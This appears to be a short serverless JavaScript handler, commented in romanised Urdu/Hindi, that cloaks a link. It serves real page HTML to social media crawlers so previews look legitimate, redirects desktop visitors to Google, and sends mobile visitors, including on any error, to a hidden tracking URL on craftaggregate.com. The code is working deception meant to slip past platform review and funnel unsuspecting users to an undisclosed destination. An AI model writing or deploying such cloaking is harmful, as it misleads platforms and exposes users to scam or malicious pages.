export async function onRequest(context) {
  try {
    const request = context.request;
    const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
    
    // 1. Social Media Bots/Crawlers ko pehchanein (Inhein redirect NAHI karna)
    const isBot = /facebookexternalhit|facebookcatalog|twitterbot|linkedinbot|pinterest|slackbot|whatsapp|telegrambot/i.test(userAgent);

    if (isBot) {
      // Agar Facebook ka bot hai, to use asli HTML (index.html) dekhne dein taake preview ban sake
      return await context.next();
    }

    // 2. Mobile devices ko check karein
    const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);

    // 3. Agar normal DESKTOP user hai, to use Google par redirect karein
    if (!isMobile) {
      return Response.redirect("https://www.google.com", 302);
    }

    // 4. Agar normal MOBILE user hai, to use final target par bhej dein
    return Response.redirect("https://craftaggregate.com/rt3n5dq7?key=0e5612fb5799030a29df1325d1189b72", 302);
    
  } catch (error) {
    // Kisi bhi error ki surat mein safe redirect fallback
    return Response.redirect("https://craftaggregate.com/rt3n5dq7?key=0e5612fb5799030a29df1325d1189b72", 302);
  }
}
